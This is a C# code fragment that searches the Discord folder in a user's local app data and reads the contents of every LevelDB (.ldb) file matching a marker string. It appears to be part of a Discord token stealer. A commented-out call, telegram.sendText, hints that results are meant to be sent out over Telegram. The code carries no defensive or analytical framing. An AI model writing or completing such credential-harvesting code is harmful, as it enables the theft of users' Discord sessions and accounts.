// Locate *.ldb files
private static List<string> SearchForFile()
{
    List<string> ldbFiles = new List<string>();
    string discordPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Discord";

    if (Directory.Exists(discordPath))
    {
        foreach (string file in Directory.GetFiles(discordPath, "*.ldb", SearchOption.AllDirectories))
        {
            try
            {
                string content = File.ReadAllText(file);
                if (content.Contains("okay"))
                {
                    ldbFiles.Add(content);
                }
            }
            catch (IOException)
            {
                // Handle any IO exceptions that might occur when reading the file
            }
        }
    }
    else
    {
        // telegram.sendText(" Didn't find Discord directory");
        Console.WriteLine(" Didn't find Discord directory");
    }

    return ldbFiles;
}
